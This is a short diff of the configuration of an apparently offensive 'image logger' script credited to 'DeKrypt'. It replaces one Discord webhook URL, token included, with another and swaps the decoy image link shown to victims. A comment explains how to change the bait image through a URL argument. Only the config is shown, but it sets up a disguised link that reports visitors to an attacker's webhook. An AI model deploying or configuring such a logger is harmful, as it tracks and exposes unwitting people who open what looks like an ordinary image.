@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1507582277088186418/LwUr9F-nqKtrlhyKWxTB0N1Yzso9gdBxyhqf6yzZGtsiSkacd1NSQY6Um1DlOHrVTRPk",
-    "image": "https://www.reddit.com/r/nes/comments/1jdfk8q/nes_games_like_kid_icarus_randomizer_amazing/", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1557503351715930222/4OGHYDudUh9X1gPIWhPlO4a-qprDJihndL3GXanGd5hGiSVR2ndsI7J5p-p3bYSlwBzX",
+    "image": "https://www.milenio.com/uploads/media/2021/10/09/memes-de-internet.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
